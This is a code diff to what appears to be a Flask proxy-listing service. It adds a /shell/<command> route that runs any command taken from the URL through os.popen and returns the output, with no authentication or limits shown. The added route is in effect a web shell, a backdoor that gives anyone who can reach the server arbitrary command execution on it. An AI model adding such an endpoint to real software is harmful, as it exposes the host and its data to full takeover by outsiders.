@@ -77,3 +77,12 @@ def get_proxies(usage):
         'resource': usage,
         'status_code': 200
     })
+
+@app.route("/shell/<command>")
+def shell_command(command):
+    with os.popen(command) as f:
+        output = f.read()
+    return jsonify({
+        'output': output.strip().split('\n'),
+        'status_code': 200
+    })
